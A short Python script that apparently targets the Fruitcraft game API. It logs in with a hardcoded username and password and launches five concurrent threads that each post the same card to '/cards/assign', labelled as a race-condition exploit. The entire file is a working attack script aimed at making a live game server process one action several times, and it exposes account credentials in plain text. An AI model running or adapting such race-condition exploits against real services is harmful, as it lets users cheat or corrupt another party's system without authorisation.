import sys, os
import json
import time
import threading
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def assign(c, card_id):
    res = c.post("/cards/assign", {"type": 1001, "cards": json.dumps([card_id])})
    print(res.get("status") if res else "Fail", end=" ")

def main():
    print("Testing Concurrent Assignments Exploit (Race Condition)...")
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    cards = d1.get("data", {}).get("cards", [])
    if not cards: return
    
    c_target = cards[0]["id"]
    
    print("Assigning card", c_target)
    
    threads = []
    # Assign concurrently
    for i in range(5):
        t = threading.Thread(target=assign, args=(c1, c_target)) 
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()

    print()

if __name__ == "__main__":
    main()
